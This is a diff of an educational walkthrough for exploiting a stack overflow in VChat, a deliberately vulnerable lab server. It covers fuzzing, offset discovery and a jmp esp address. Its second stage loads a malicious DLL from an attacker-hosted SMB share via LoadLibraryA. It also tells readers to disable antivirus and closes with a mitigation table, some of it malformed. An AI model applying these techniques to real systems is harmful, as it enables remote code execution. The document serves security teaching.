@@ -1,17 +1,33 @@
 # VChat KSTET Exploit: DLL Side-Loading
-
-*Notice*: The following exploit, and its procedures are based on the original [Blog](https://fluidattacks.com/blog/vulnserver-kstet-alternative/)
+> [!NOTE]
+> - The following exploit and its procedures are based on an original [Blog](https://fluidattacks.com/blog/vulnserver-kstet-alternative/) from fluid attacks.
+> - Disable Windows *Real-time protection* at *Virus & threat protection* -> *Virus & threat protection settings*.
+> - Don't copy the *$* sign when copying and pasting a command in this tutorial.
+> - Offsets may vary depending on what version of VChat was compiled, the version of the compiler used and any compiler flags applied during the compilation process.
 ___
 
-As with the previous exploitation of the [KSTET](https://github.com/DaintyJet/VChat_KSTET_Multi) and similarly constrained commands such as [GTER](https://github.com/DaintyJet/VChat_GTER_EggHunter) we are limited by the space available on the buffer. We will not be repeating the use of [Egghunters](https://www.hick.org/code/skape/papers/egghunt-shellcode.pdf) or [Code-Reuse](https://github.com/DaintyJet/VChat_GTER_CodeReuse) methods. We will be using a [sideloading](https://www.crowdstrike.com/blog/dll-side-loading-how-to-combat-threat-actor-evasion-techniques/) technique. This means a legitimate executable, will use a function like [LoadLibraryA](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya) to load a malicious DLL into the processes memory and use this to execute malicious code.
+As with the previous exploitation of the [KSTET](https://github.com/DaintyJet/VChat_KSTET_Multi) and similarly constrained commands such as [GTER](https://github.com/DaintyJet/VChat_GTER_EggHunter) we are limited by the space available on the buffer which was allocated on the stack. We will not be repeating the use of [Egghunters](https://www.hick.org/code/skape/papers/egghunt-shellcode.pdf) or [Code-Reuse](https://github.com/DaintyJet/VChat_GTER_CodeReuse) exploitation strategies. We will be using a [sideloading](https://www.crowdstrike.com/blog/dll-side-loading-how-to-combat-threat-actor-evasion-techniques/) technique. This means a legitimate executable, will use a function like [LoadLibraryA](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya) to load a malicious DLL into the processes memory and use this to execute malicious code.
 
-DLLs are [Dynamic-Link-Libraries](https://learn.microsoft.com/en-us/troubleshoot/windows-client/deployment/dynamic-link-library), they are used as shared libraries that can be loaded at runtime by a process. This is where the [LoadLibraryA](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya) function comes into play, allowing us to use the malicious functions embedded in the DLL.
+DLLs are [Dynamic-Link-Libraries](https://learn.microsoft.com/en-us/troubleshoot/windows-client/deployment/dynamic-link-library), they are used as shared libraries that can be loaded at runtime by a process. This is where the [LoadLibraryA](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya) function comes into play, allowing us to use the malicious functions embedded in the DLL. If the DLL has a DLLMain function, this is executed when the library is loaded. Normally this is used to initialize values used by the functions contained within, but we will use this to execute malicious code when the library is loaded by the shellcode.
 
-**Notice**: Please setup the Windows and Linux systems as described in [SystemSetup](./SystemSetup/README.md)!
-## Exploitation
-### PreExploitation
-1. **Windows**: Setup Vchat.
-   1. Compile VChat and it's dependencies if they has not already been compiled. This is done with mingw.
+> [!IMPORTANT]
+> Please set up the Windows and Linux systems as described in [SystemSetup](./SystemSetup/README.md)!
+
+## VChat Setup and Configuration
+This section covers the compilation process, and use of the VChat Server. We include instructions for both the original VChat code which was compiled with MinGW and GCC on Windows, and the newly modified code that can be compiled with the Visual Studio C++ compiler.
+
+### Visual Studio
+1. Open the [Visual Studio project](https://github.com/DaintyJet/vchat-fork/tree/main/Server/Visual%20Studio%20Projects/DLL/Essfun) for the *essfunc* DLL.
+2. Build the project, as this contains inline assembly the target DLL file must be compiled as a x86 DLL (32-bits).
+3. Copy the Resulting DLL from the *Debug* folder in the [Essfunc Project](https://github.com/DaintyJet/vchat-fork/tree/main/Server/Visual%20Studio%20Projects/DLL/Essfun/Debug) into the *Debug* folder in the [VChat Project](https://github.com/DaintyJet/vchat-fork/tree/main/Server/Visual%20Studio%20Projects/EXE/VChat/Debug)
+
+	<img src="Images/VS-Comp.png">
+
+4. Open the [Visual Studio project](https://github.com/DaintyJet/vchat-fork/tree/main/Server/Visual%20Studio%20Projects/EXE/VChat) for the *VChat* EXE.
+5. Build the Project, our executable will be in the *Debug* folder. You can then launch the executable!
+### Mingw/GCC
+
+   1. Compile VChat and its dependencies if they have not already been compiled. This is done with mingw.
       1. Create the essfunc object File. 
 		```powershell
 		# Compile Essfunc Object file 
@@ -19,7 +35,7 @@ DLLs are [Dynamic-Link-Libraries](https://learn.microsoft.com/en-us/troubleshoot
 		```
       2. Create the [DLL](https://learn.microsoft.com/en-us/troubleshoot/windows-client/deployment/dynamic-link-library) containing functions that will be used by the VChat.   
 		```powershell
-		# Create a the DLL with a static (preferred) base address of 0x62500000
+		# Create a DLL with a static (preferred) base address of 0x62500000
 		$ gcc.exe -shared -o essfunc.dll -Wl,--out-implib=libessfunc.a -Wl,--image-base=0x62500000 essfunc.o
 		```
          * ```-shared -o essfunc.dll```: We create a DLL "essfunc.dll", these are equivalent to the [shared library](https://tldp.org/HOWTO/Program-Library-HOWTO/shared-libraries.html) in Linux. 
@@ -34,9 +50,16 @@ DLLs are [Dynamic-Link-Libraries](https://learn.microsoft.com/en-us/troubleshoot
          * ```vchat.c```: The source file is "vchat.c".
          * ```-o vchat.exe```: The output file will be the executable "vchat.exe".
          * ```-lws2_32 ./libessfunc.a```: Link the executable against the import library "libessfunc.a", enabling it to use the DLL "essfunc.dll".
-   2. Launch the VChat application. 
-		* Click on the Icon in File Explorer when it is in the same directory as the essfunc dll.
-2. **Linux**: Run NMap.
+
+## Exploit Process
+The following sections cover the process that should (Or may) be followed when performing this exploitation on the VChat application. It should be noted that the [**Dynamic Analysis**](#dynamic-analysis) section makes certain assumptions such as having access to the application binary that may not be realistic in cases where you are exploiting remote servers; however, the enumeration and exploitation of generic Windows, and Linux servers to get the binary from a remote server falls outside of the scope of this document.
+
+### Information Collecting
+We want to understand the VChat program and how it works in order to effectively exploit it. Before diving into the specific of how VChat behaves the most important information for us is the IP address of the Windows VM that runs VChat and the port number that VChat runs on. 
+1. Launch the VChat application. 
+	* Click on the Icon in File Explorer when it is in the same directory as the essfunc dll.
+	* You can also use the simple [VChatGUI](https://github.com/daintyjet/VChatGUI) program to launch the executable.
+2. (Optional) **Linux**: Run NMap.
 	```sh
 	# Replace the <IP> with the IP of the machine.
 	$ nmap -A <IP>
@@ -66,8 +89,8 @@ DLLs are [Dynamic-Link-Libraries](https://learn.microsoft.com/en-us/troubleshoot
 
 	* Now, trying every possible combinations of strings would get quite tiresome, so we can use the technique of *fuzzing* to automate this process as discussed later in the exploitation section.
 	* In this case we will do some fuzzing to keep the exploit sections relatively consistent, but as you can see we know crashing this command will not take much!
-### Dynamic Analysis 
-This phase of exploitation is where we launch the target application or binary and examine its behavior based on the input we provide. We can do this both using automated fuzzing tools and manually generated inputs.
+### Dynamic Analysis
+This phase of exploitation is where we launch the target application or binary and examine its behavior based on the input we provide. We can do this both using automated fuzzing tools and manually generated inputs. We do this to discover how we can construct a payload to modify how VChat behaves. We want to construct an attack string as follows: `padding-bytes|address-to-overwrite-return-address|shell-code`, where | means concatenation. Therefore, we need know how many bytes are needed to properly pad and align our overflow to overwrite critical sections of data. 
 
 #### Launch VChat
 1. Open Immunity Debugger
@@ -75,20 +98,20 @@ This phase of exploitation is where we launch the target application or binary a
 	<img src="Images/I1.png" width=800> 
 
     * Note that you may need to launch it as the *Administrator* this is done by right clicking the icon found in the Windows search bar or on the desktop as shown below:
-			
+
 	<img src="Images/I1b.png" width = 200>
 
-2. Attach VChat: There are Two options! 
-   1. When the VChat is already Running. 
+2. Attach VChat: There are Two options!
+   1. When the VChat is already Running.
         1. Click File -> Attach
 
 			<img src="Images/I2a.png" width=200>
 
-		2. Select VChat 
+		2. Select VChat
 
 			<img src="Images/I2b.png" width=500>
 
-   2. When VChat is not already Running -- This is the most reliable option!
+   2. (Optional) When VChat is not already Running -- This is the most reliable option!
         1. Click File -> Open, Navigate to VChat
 
 			<img src="Images/I3-1.png" width=800>
@@ -101,20 +124,21 @@ This phase of exploitation is where we launch the target application or binary a
 
 			<img src="Images/I3-3.png" width=800>
 3. Ensure that the execution in not paused, click the red arrow (Top Left).
-	
+
 	<img src="Images/I3-4.png" width=800>
 
 #### Fuzzing
-SPIKE is a C based fuzzing tool that is commonly used by professionals, it is available in [kali linux](https://www.kali.org/tools/spike/) and other [pen-testing platforms](https://www.blackarch.org/fuzzer.html) repositories. We should note that the original reference page appears to have been taken over by a slot machine site at the time of this writing, so you should refer to the [original writeup](http://thegreycorner.com/2010/12/25/introduction-to-fuzzing-using-spike-to.html) of the SPIKE tool by vulnserver's author [Stephen Bradshaw](http://thegreycorner.com/) in addition to [other resources](https://samsclass.info/127/proj/p18-spike.htm) for guidance. The source code is still available on [GitHub](https://github.com/guilhermeferreira/spikepp/) and still maintained on [GitLab](https://gitlab.com/kalilinux/packages/spike).
+SPIKE is a C based fuzzing tool that is commonly used by professionals, it is available in [kali linux](https://www.kali.org/tools/spike/). Here is [a tutorial](http://thegreycorner.com/2010/12/25/introduction-to-fuzzing-using-spike-to.html) of the SPIKE tool by vulnserver's author [Stephen Bradshaw](http://thegreycorner.com/) in addition to [other resources](https://samsclass.info/127/proj/p18-spike.htm) for guidance. The source code is still available on [GitHub](https://github.com/guilhermeferreira/spikepp/) and still maintained on [GitLab](https://gitlab.com/kalilinux/packages/spike).
 
 1. Open a terminal on the **Kali Linux Machine**.
+
 2. Create a file ```KSTET.spk``` file with your favorite text editor. We will be using a SPIKE script and interpreter rather than writing our own C based fuzzer. We will be using the [mousepad](https://github.com/codebrainz/mousepad) text editor in this walkthrough though any editor may be used.
 	```sh
 	$ mousepad KSTET.spk
 	```
-	* If you do not have a GUI environment, an editor like [nano](https://www.nano-editor.org/), [vim](https://www.vim.org/) or [emacs](https://www.gnu.org/software/emacs/) could be used.  
+	* If you do not have a GUI environment, an editor like [nano](https://www.nano-editor.org/), [vim](https://www.vim.org/) or [emacs](https://www.gnu.org/software/emacs/) could be used.
 3. Define the FUZZER parameters, we are using [SPIKE](https://www.kali.org/tools/spike/) with the ```generic_send_tcp``` interpreter for TCP based fuzzing.  
-		
+
 	```
 	s_readline();
 	s_string("KSTET ");
@@ -123,14 +147,14 @@ SPIKE is a C based fuzzing tool that is commonly used by professionals, it is av
     * ```s_readline();```: Return the line from the server.
     * ```s_string("KSTET ");```: Specifies that we start each message with the *String* KSTET.
     * ```s_string_variable("*");```: Specifies a String that we will mutate over, we can set it to * to say "any" as we do in our case. 
-4. Use the Spike Fuzzer. 	
+4. Use the Spike Fuzzer. 
 	```
 	$ generic_send_tcp <VChat-IP> <Port> <SPIKE-Script> <SKIPVAR> <SKIPSTR>
 
-	# Example 
-	# generic_send_tcp 10.0.2.13 9999 KSTET.spk 0 0	
+	# Example
+	# generic_send_tcp 10.0.2.13 9999 KSTET.spk 0 0
 	```
-    * ```<VChat-IP>```: Replace this with the IP of the target machine. 
+    * ```<VChat-IP>```: Replace this with the IP of the target machine.
 	* ```<Port>```: Replace this with the target port.
 	* ```<SPIKE-Script>```: Script to run through the interpreter.
 	* ```<SKIPVAR>```: Skip to the n'th **s_string_variable**, 0 -> (S - 1) where S is the number of variable blocks.
@@ -144,7 +168,7 @@ SPIKE is a C based fuzzing tool that is commonly used by professionals, it is av
 
 	<img src="Images/I4b.png" width=600>
 
-	* Here we crash the server once we have entered ninety six `A`s. 
+	* Here we crash the server once we have entered ninety six `A`s.
 
 	<img src="Images/I4c.png" width=600>
 
@@ -153,8 +177,8 @@ SPIKE is a C based fuzzing tool that is commonly used by professionals, it is av
 
 	<img src="Images/I4d.png" width=600>
 
-8. We can look at the comparison of the Register values before and after the fuzzing in Immunity Debugger, here we can see the EIP has been overwritten. This means we overwrote the return address on the stack! 
-	* Before 
+8. We can look at the comparison of the Register values before and after the fuzzing in Immunity Debugger, here we can see the EIP has been overwritten. This means we overwrote the return address on the stack!
+	* Before
 
 		<img src="Images/I7.png" width=600>
 
@@ -165,14 +189,14 @@ SPIKE is a C based fuzzing tool that is commonly used by professionals, it is av
       * The best way to reproduce this is to use [exploit0.py](./SourceCode/exploit0.py).
 9. We can examine the messages SPIKE was sending by examining the [tcpdump](https://www.tcpdump.org/) or [wireshark](https://www.wireshark.org/docs/wsug_html/) output.
 
-	<img src="Images/I5.png" width=800> 
+	<img src="Images/I5.png" width=800>
 
 	* After capturing the packets, right click a TCP stream and click follow! This allows us to see all of the output.
 
-		<img src="Images/I6.png" width=600> 
+		<img src="Images/I6.png" width=600>
 
 #### Further Analysis
-1. Generate a Cyclic Pattern. We do this so we can tell *where exactly* the return address is located on the stack. We can use the *Metasploit* program [pattern_create.rb](https://github.com/rapid7/metasploit-framework/blob/master/tools/exploit/pattern_create.rb) to generate this string. By analyzing the values stored in the register which will be a subset of the generated string after a crash, we can tell where in memory the return address is stored. 
+1. Generate a Cyclic Pattern. We do this so we can tell *where exactly* the return address is located on the stack. We can use the *Metasploit* program [pattern_create.rb](https://github.com/rapid7/metasploit-framework/blob/master/tools/exploit/pattern_create.rb) to generate this string. By analyzing the values stored in the register which will be a subset of the generated string after a crash, we can tell where in memory the return address is stored. We can generate a string with the length of 100, as we know our program crashes with a input of less than that size; though you may use any size that will also lead to the program being crashed.
 	```
 	/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100
 	```
@@ -190,14 +214,14 @@ SPIKE is a C based fuzzing tool that is commonly used by professionals, it is av
 
 	<img src="Images/I10.png" width=600> 
 
-4. The next thing that is done, is to modify the exploit program to reflect the script [exploit2.py](./SourceCode/exploit2.py).
+4. The next thing that is done, is to modify the exploit program to reflect the script [exploit2.py](./SourceCode/exploit2.py). We chose to overflow the return address with the a series of `B`s since this will be recognizable in the register, and lead to a crashed program state allowing us to view the `EIP` register after the overflow occurred to verify this.
    * We do this to validate that we have the correct offset for the return address!
 
 		<img src="Images/I11.png" width=600>
 
 		* See that the EIP is a series of the value `42` that is a series of Bs. This tells us that we can write an address to that location in order to change the control flow of the program.
-		* Note: It took a few runs for this to work and update on the Immunity debugger.
-5. Use the [mona.py](https://github.com/corelan/mona) python program within the Immunity Debugger to determine some useful information about our target process. We run the command ```!mona findmsp``` in the command line at the bottom of Immunity Debugger. **Note:** We must have sent the cyclic pattern and it must be present in the stack frame at the time we run this command!
+		* Note: It took a few runs for this to work and update in Immunity debugger.
+5. (Optional) Use the [mona.py](https://github.com/corelan/mona) python program within Immunity Debugger to determine useful information about our target process. While the *cyclic pattern* from [exploit1.py](./SourceCode/exploit1.py) is in memory we can run the command ```!mona findmsp``` in the command line at the bottom of the Immunity Debugger GUI. **Note:** We must have sent the cyclic pattern and it must be present in the stack frame at the time we run this command!
 
 	<img src="Images/I12.png" width=600>
 
@@ -214,12 +238,12 @@ SPIKE is a C based fuzzing tool that is commonly used by professionals, it is av
       * The `-r esp` flag tells *mona.py* to search for the `jmp esp` instruction.
       * The `-cp nonull` flag tells *mona.py* to ignore null values.
       * The `-o` flag tells *mona.py* to ignore OS modules.
-      * We can select any output from this, 
+      * We can select any output from this.
 
 	<img src="Images/I15.png" width=600>
 
       * We can see there are nine possible `jmp esp` instructions in the essfunc dll that we can use, any should work. We will use the last one `0x625014E6`.
-8. Use a program like [exploit3.py](./SourceCode/exploit3.py) to verify that this works.
+8. Use a program like [exploit3.py](./SourceCode/exploit3.py) to verify that this works. By setting breakpoints and injecting the `jmp esp` instruction into the function's return address we can verify that it is possible to jump back to the stack in order to execute shell code.
 
 	https://github.com/DaintyJet/VChat_KSTET_DLL/assets/60448620/597aab51-547b-402b-bae9-6285930b66d8
 
@@ -242,11 +266,13 @@ SPIKE is a C based fuzzing tool that is commonly used by professionals, it is av
 
 	5. Notice that we jump to the stack we just overflowed!
 
-		<img src="Images/I20.png" width=600> 
+		<img src="Images/I20.png" width=600>
 
 
 Now that we have all the necessary parts for the creation of a exploit we will discuss what we have done so far (the **exploit.py** files), and how we can now expand our efforts to gain a shell in the target machine.
 ### Exploitation
+Up until this point in time,  we have been performing [Denial of Service](https://attack.mitre.org/techniques/T0814/) (DoS) attacks. Since we simply overflowed the stack with what is effectively garbage address values (a series of `A`s, `B`s and `C`s) all we have done with our exploits is crash the VChat server directly or indirectly after our jump instructions lead to an invalid operation. Now, we have all the information necessary to control the flow of VChat's execution, allowing us to inject [Shellcode](https://www.sentinelone.com/blog/malicious-input-how-hackers-use-shellcode/) and perform a more meaningful attack. Our exploit will still be multi-staged, however the method we use to execute the malious code differs from the previous [KSTET Multistage](https://github.com/DaintyJet/VChat_KSTET_Multi) exploit.
+
 1. We know from one of our previous runs of `mona.py` (`!mona findmsp`) that we have a very limited amount of space following the *EIP* register. As we have done in previous exploits we will preform a short relative jump to the start of the buffer so we can use the sixty six bytes that precede our return address for our first stage shell code.
 
 	https://github.com/DaintyJet/VChat_KSTET_DLL/assets/60448620/f0c15355-9098-4e24-8c60-48652d86bf92
@@ -255,7 +281,7 @@ Now that we have all the necessary parts for the creation of a exploit we will d
 
 		<img src="Images/I17.png" width=600>
 
-   2. Modify your exploit to reflect the [exploit3.py](./SourceCode/exploit3.py) program and run it until an overflow occurs (See EIP/ESP and stack changes), you should be able to tell by the black text at the bottom the the screen that says `Breakpoint at ...`.
+   2. Modify your exploit to reflect the [exploit3.py](./SourceCode/exploit3.py) program and run it until an overflow occurs (See EIP/ESP and stack changes), you should be able to tell by the black text at the bottom the the screen that says `Breakpoint at ...`. We are doing this to generate and verify that a relative short jump instruction allows us to jump to the start of our buffer where we have more space to work with.
 
 		<img src="Images/I18.png" width=600>
 
@@ -265,17 +291,17 @@ Now that we have all the necessary parts for the creation of a exploit we will d
 
 	4. Now right click the address we jumped to, and select Assemble creating the `JMP <Address>` command, where `<Address>` is replaced with the starting address of our buffer. 
 
-		* Select Assemble 
+		* Select Assemble
 
 			<img src="Images/I22.png" width=600>
 
 		* Assemble the instruction.
 
-			<img src="Images/I23.png" width=600> 
+			<img src="Images/I23.png" width=600>
 
 	5. Once you click *step* we should arrive at the start of the buffer, now right click the newly assembled instruction and select *Binary Copy*.
 
-		<img src="Images/I24.png" width=600> 
+		<img src="Images/I24.png" width=600>
 
 2. Now that we have the Assembly instruction for the Short Jump, place it into the python program as shown in [exploit4.py](./SourceCode/exploit4.py).
 	```python
@@ -294,12 +320,11 @@ Now that we have all the necessary parts for the creation of a exploit we will d
 	https://github.com/DaintyJet/VChat_KSTET_DLL/assets/60448620/c509b866-ddc1-4fcf-8eff-3adc1a85d92b
 
 #### Malicious DLLs
-As was previously discussed in the introduction of this walkthrough DLLs are [Dynamic-Link-Libraries](https://learn.microsoft.com/en-us/troubleshoot/windows-client/deployment/dynamic-link-library), these are libraries that are loaded into memory, and shared between processes. If a program is set to use a custom DLL, or is not statically-linked then the addresses for the functions in a DLL will be resolved by a [Runtime Dynamic Linker](https://learn.microsoft.com/en-us/windows/win32/dlls/run-time-dynamic-linking) or a [Loadtime Dynamic Linker](https://learn.microsoft.com/en-us/windows/win32/dlls/load-time-dynamic-linking). In our case the use of the [LoadLibraryA](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya) means we will be invoking the [Runtime Dynamic Linker](https://learn.microsoft.com/en-us/windows/win32/dlls/run-time-dynamic-linking). Once we have loaded and linked our malicious DLL to the executable we can use any function located within the DLL. Additionally if the DLL contains a [DLLMain(...)](https://learn.microsoft.com/en-us/troubleshoot/windows-client/deployment/dynamic-link-library#the-dll-entry-point) function, this will be executed when the DLL is loaded. This is not present in all DLLs and when it is will often be used to initialize any data structures or variables that will be needed by the DLL's functions. This attack should **not be confused** with DLL load order hijacking attacks which exploit the [search order](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order) Windows uses for resolving DLLs.
+As was previously discussed in the introduction of this walkthrough DLLs are [Dynamic-Link-Libraries](https://learn.microsoft.com/en-us/troubleshoot/windows-client/deployment/dynamic-link-library), these are libraries that are loaded into memory, and *shared* between processes. If a program is set to use a custom DLL, or is not statically-linked then the addresses for the functions in a DLL will be resolved by a [Runtime Dynamic Linker](https://learn.microsoft.com/en-us/windows/win32/dlls/run-time-dynamic-linking) or a [Loadtime Dynamic Linker](https://learn.microsoft.com/en-us/windows/win32/dlls/load-time-dynamic-linking). In our case the use of the [LoadLibraryA](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya) means we will be invoking the [Runtime Dynamic Linker](https://learn.microsoft.com/en-us/windows/win32/dlls/run-time-dynamic-linking). Once we have loaded and linked our malicious DLL to the executable we can use any function located within the DLL. Additionally if the DLL contains a [DLLMain(...)](https://learn.microsoft.com/en-us/troubleshoot/windows-client/deployment/dynamic-link-library#the-dll-entry-point) function, this will be executed when the DLL is loaded. This is not present in all DLLs and when it is will often be used to initialize any data structures or variables that will be needed by the DLL's functions. This attack should **not be confused** with DLL load order hijacking attacks which exploit the [search order](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order) Windows uses for resolving DLLs.
 
-DLLs are commonly used in Windows applications for a [number of reasons](https://learn.microsoft.com/en-us/troubleshoot/windows-client/deployment/dynamic-link-library#dll-advantages). One of the first to be mentioned is that fewer system resources will be used when the DLL is used by many processes as rather than loading and linking the library for each individual process, the DLL will be loaded into memory once and each processes that uses the DLL will be linked against it. DLLs also allow programs to at runtime load the correct DLL based on the requirements and conditions of the system, this promotes more modular systems. Finally we can see that if a program uses DLLs they do not need to be recompiled and relinked if the DLL is modified and replaced; only if the function signature or returned values changes would the executable need to be modified and recompiled.
+DLLs are commonly used in Windows applications for a [number of reasons](https://learn.microsoft.com/en-us/troubleshoot/windows-client/deployment/dynamic-link-library#dll-advantages). One of the first to be mentioned is efficiency as fewer system resources will be used when the DLL is loaded and shared between many processes rather than loading and linking the library for each individual process, this is because the DLL will be loaded into memory once and each processes that uses the DLL will be linked against it. DLLs also allow programs to at runtime load the correct DLL based on the requirements and conditions of the system, this promotes more modular systems. Finally we can see that if a program uses DLLs they do not need to be recompiled and relinked if the DLL is modified and replaced; the program need to be recoiled only if the function signature or returned values change as the executable would need to be modified to account for this.
 
-This is why DLLs are used in the Windows OS to provide API wrappers to the OS Systemcalls, in addition to the interrupts for Windows systemcalls not being the most stable and changing from time to time. You could use some [online resources](https://j00ru.vexillium.org/syscalls/nt/64/) that track the systemcall interfaces and recompile your program for each build but it is much simpler to use the APIS provided in the DLLs!
-
+This is why DLLs are used in the Windows OS to provide API wrappers to the OS Systemcalls, in addition to the fact that the numeric interrupts used to start/signal Windows systemcalls are not the most stable and change from time to time in Windows Updates and versions. You could use some [online resources](https://j00ru.vexillium.org/syscalls/nt/64/) that track the systemcall interfaces and recompile your program for each build but it is much simpler to use the APIs provided in the DLLs to prevent the unnecessary recompilations!
 
 We will be using the fact that the [LoadLibraryA](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya) function can accept a location string in the form of a [Universal Naming Convention (UNC)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/62e862f4-2a51-452e-8eeb-dc4ff5ee33cc) string. This allows us to use the `LoadLibraryA` function to load a malicious DLL hosted on a remote [SMB share](https://learn.microsoft.com/en-us/windows-server/storage/file-server/file-server-smb-overview). We will use the [Impacket-Scripts](https://www.kali.org/tools/impacket-scripts/) package of exploitation tools to host a SMB share on the Kali Linux machine!
 
@@ -331,7 +356,7 @@ $ sudo impacket-smbserver -smb2support ABCD .
 	https://github.com/DaintyJet/VChat_KSTET_DLL/assets/60448620/ee57745f-bddc-4f6f-8788-372524798848
 
 #### Shellcode Generation
-We will as has been stated many times previously be using the LoadLibraryA function which has the following function signature: 
+We will as has been stated many times previously be using the `LoadLibraryA` function which has the following function signature: 
 ```
 HMODULE LoadLibraryA(
   [in] LPCSTR lpLibFileName
@@ -528,7 +553,63 @@ Now we we have everything we need to exploit the VChat server using the DLL side
 5. Run the [exploit5.py](./SourceCode/exploit5.py) program!
 
 	https://github.com/DaintyJet/VChat_KSTET_DLL/assets/60448620/8da0d1be-485d-4e47-93b2-91c53a917773
+## Attack Mitigation Table
+In this section we will discuss the effects a variety of defenses would have on *this specific attack* on the VChat server, specifically we will be discussing their effects on a buffer overflow that overwrites a return address and attempts to execute shellcode that has been written to the stack, this shellcode will then use the `LoadLibraryA(...)` function in order to run a larger second stage. We will make a note where that these mitigations may be bypassed.
 
+> [!NOTE]
+> This exploit is similar to the [KSTET MultiStaged](https://github.com/DaintyJet/VChat_KSTET_Multi) exploit, the main difference being how the second stage is loaded and ran.
+
+First we will examine the effects individual defenses have on this exploit, and then we will examine the effects a combination of these defenses would have on the VChat exploit.
+
+The mitigation we will be using in the following examination are:
+* [Buffer Security Check (GS)](https://github.com/DaintyJet/VChat_Security_Cookies): Security Cookies are inserted on the stack to detect when critical data such as the base pointer, return address or arguments have been overflowed. Integrity is checked on function return.
+* [Data Execution Prevention (DEP)](https://github.com/DaintyJet/VChat_DEP_Intro): Uses paged memory protection to mark all non-code (.text) sections as non-executable. This prevents shellcode on the stack or heap from being executed as an exception will be raised.
+* [Address Space Layout Randomization (ASLR)](https://github.com/DaintyJet/VChat_ASLR_Intro): This mitigation makes it harder to locate where functions and datastructures are located as their region's starting address will be randomized. This is only done when the process is loaded, and if a DLL has ASLR enabled it will only have it's addresses randomized again when it is no longer in use and has been unloaded from memory.
+* [SafeSEH](https://github.com/DaintyJet/VChat_SEH): This is a protection for the Structured Exception Handing mechanism in Windows. It validates that the exception handler we would like to execute is contained in a table generated at compile time. 
+* [SEHOP](https://github.com/DaintyJet/VChat_SEH): This is a protection for the Structured Exception Handing mechanism in Windows. It validates the integrity of the SEH chain during a runtime check.
+* [Control Flow Guard (CFG)](https://github.com/DaintyJet/VChat_CFG): This mitigation verifies that indirect calls or jumps are preformed to locations contained in a table generated at compile time. Examples of indirect calls or jumps include function pointers being used to call a function, or if you are using `C++` virtual functions would be considered indirect calls as you index a table of function pointers. 
+* [Heap Integrity Validation](https://github.com/DaintyJet/VChat_Heap_Defense): This mitigation verifies the integrity of a heap when operations are preformed on the heap itself, such as allocations or frees of heap objects.
+* [Control Flow Guard](https://github.com/DaintyJet/VChat_CFG): This mitigation verifies that the target of an indirect jump or call is a member of a whitelist generated at compile time.
+### Individual Defenses: VChat Exploit 
+|Mitigation Level|Defense: Buffer Security Check (GS)|Defense: Data Execution Prevention (DEP)|Defense: Address Space Layout Randomization (ASLR) |Defense: SafeSEH| Defense: SEHOP | Defense: Heap Integrity Validation| Defense: Control Flow Guard (CFG) | 
+|-|-|-|-|-|-|-|-|
+|No Effect| | | |X |X | X| X| X|
+|Partial Mitigation| | |X| | | | |
+|Full Mitigation|X| | | | | | | |
+---
+|Mitigation Level|Defense: Buffer Security Check (GS)|Defense: Data Execution Prevention (DEP)|Defense: Address Space Layout Randomization (ASLR) |Defense: SafeSEH| Defense: SEHOP | Defense: Heap Integrity Validation| Defense: Control Flow Guard (CFG) |  
+|-|-|-|-|-|-|-|-|
+|No Effect| | |X |X |X | X| X| X|
+|Partial Mitigation| | |X| | | | |
+|Full Mitigation| |X| | | | | | |
+---
+|Mitigation Level|Defenses|
+|-|-|
+|No Effect|SafeSEH, SEHOP, Heap Integrity Validation, and Control Flow Guard (CFG)|
+|Partial Mitigation|Address Space Layout Randomization|
+|Full Mitigation|Buffer Security Checks (GS) ***or*** Data Execution Prevention (DEP)|
+* `Defense: Buffer Security Check (GS)`: This mitigation strategy proves effective against stack based buffer overflows that overwrite the return address or arguments of a function. This is because the randomly generated security cookie is placed before the return address and it's integrity is validated before the return address is loaded into the `EIP` register. As the security cookie is placed before the return address in order for us to overflow the return address we would have to corrupt the security cookie allowing us to detect the overflow.
+* `Defense: Data Execution Prevention (DEP)`: This mitigation strategy proves effective against stack based buffer overflows that attempt to **directly execute** shellcode located on the stack as this would raise an exception.
+* `Defense: Address Space Layout Randomization (ASLR)`: This is partially effective as the address of the external functions we call are randomized. However the randomization of the addresses is only guaranteed when the DLLs have been unloaded from memory which for these common libraries is only guaranteed when the system reboots. Meaning the addresses of the external functions we leverage  and reuse will be the same until we reboot.
+* `Defense: SafeSEH`: This does not affect our exploit as we do not leverage Structured Exception Handling.
+* `Defense: SEHOP`: This does not affect our exploit as we do not leverage Structured Exception Handling.
+* `Defense: Heap Integrity Validation`: This does not affect our exploit as we do not leverage the Windows Heap.
+* `Defense: Control Flow Guard`: This does not affect our exploit as we do not leverage indirect calls or jumps. 
+> [!NOTE]
+> `Defense: Buffer Security Check (GS)`: If the application improperly initializes the global security cookie, or contains additional vulnerabilities that can leak values on the stack then this mitigation strategy can be bypassed.
+>
+> `Defense: Data Execution Prevention (DEP)`: If the attacker employs a [ROP Technique](https://github.com/DaintyJet/VChat_TRUN_ROP) then this defense can by bypassed.
+>
+> `Defense: Address Space Layout Randomization (ASLR)`: This defense can be bypassed if the attacker can leak addresses, or they may brute force the offsets of functions they are calling in the shellcode. This mitigation does not prevent the exploit, but simply makes it harder and less reliable.
+ ### Combined Defenses: VChat Exploit
+|Mitigation Level|Defense: Buffer Security Check (GS)|Defense: Data Execution Prevention (DEP)|Defense: Address Layout Randomization (ASLR) |Defense: SafeSEH| Defense: SEHOP | Defense: Heap Integrity Validation| Defense: Defense: Control Flow Guard (CFG) |
+|-|-|-|-|-|-|-|-|
